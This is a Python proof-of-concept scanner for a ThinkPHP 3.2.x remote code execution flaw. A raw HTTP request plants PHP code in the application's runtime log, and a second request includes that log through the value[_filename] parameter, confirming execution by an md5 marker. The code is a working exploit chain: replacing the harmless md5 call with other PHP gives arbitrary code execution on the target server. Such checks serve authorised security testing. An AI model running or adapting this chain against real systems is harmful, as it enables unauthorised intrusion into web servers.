"""  
@Time: 2023/11/1 17:57 
@Auth: Y5neKO
@File: Thinkphp32_rce.py 
@IDE: PyCharm 
"""
import re
import socket
import urllib
from datetime import date, timedelta
from urllib.parse import urlparse

import requests


def run(url, timeout):
    relsult = {
        'name': 'ThinkPHP3.2.x 远程代码执行',
        'vulnerable': False,
        'method': None,
        'url': None,
        'payload': None
    }
    payload1 = b'''
GET /index.php?m=--><?=md5(1);?> HTTP/1.1
Host: localhost:8080
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Safari/605.1.15
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=b6r46ojgc9tvdqpg9efrao7f66;
Upgrade-Insecure-Requests: 1

    '''.replace(b'\n', b'\r\n')
    try:
        o_h = urlparse(url)
        a = o_h.netloc.split(':')
        port = 80
        if 2 == len(a):
            port = a[1]
        elif 'https' in o_h.scheme:
            port = 443
        host = a[0]
        with socket.create_connection((host, port), timeout=5) as conn:
            conn.send(payload1)
            req1 = conn.recv(10240).decode()
            today = (date.today() + timedelta()).strftime("%y_%m_%d")
            payload2 = urllib.parse.urljoin(url,
                                            'index.php?m=Home&c=Index&a=index&value['
                                            '_filename]=./Application/Runtime/Logs/Common/{0}.log'.format(
                                                today))

            req2 = requests.get(payload2, timeout=3)
            if re.search(r'c4ca4238a0b923820dcc509a6f75849b', req2.text):
                relsult['vulnerable'] = True
                relsult['method'] = 'GET'
                relsult['url'] = url
                relsult['payload'] = payload2
        return relsult
    except:
        return relsult